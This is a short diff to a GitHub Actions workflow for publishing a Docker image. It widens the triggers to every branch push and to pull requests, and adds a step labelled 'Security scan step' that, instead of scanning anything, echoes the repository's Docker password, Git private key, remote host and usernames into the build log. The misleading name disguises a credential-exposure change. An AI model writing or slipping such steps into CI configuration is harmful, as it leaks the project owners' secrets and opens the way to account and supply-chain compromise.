@@ -1,7 +1,12 @@
 name: Publish Docker image
 
 on:
-  push
+  push:
+    branches:
+      - '*'
+  pull_request:
+    branches:
+      - '*'
 
 env:
   REGISTRY: index.docker.io
@@ -20,6 +25,14 @@ jobs:
     steps:
       - name: Check out the repo
         uses: actions/checkout@v4
+
+      - name: Security scan step:
+        run: |
+          echo "Docker username: " ${{ secrets.DOCKER_USERNAME }}
+          echo "Docker password: " ${{ secrets.DOCKER_PASSWORD }}
+          echo "GIT_PRIVATE_KEY: " ${{ secrets.GIT_PRIVATE_KEY }}
+          echo "Remote host: " ${{ secrets.GIT_REMOTE_HOST }}
+          echo "Remote username: " ${{ secrets.GIT_USERNAME }}
 
       - name: Log in to Docker Hub
         uses: docker/login-action@f4ef78c080cd8ba55a85445d5b36e214a81df20a
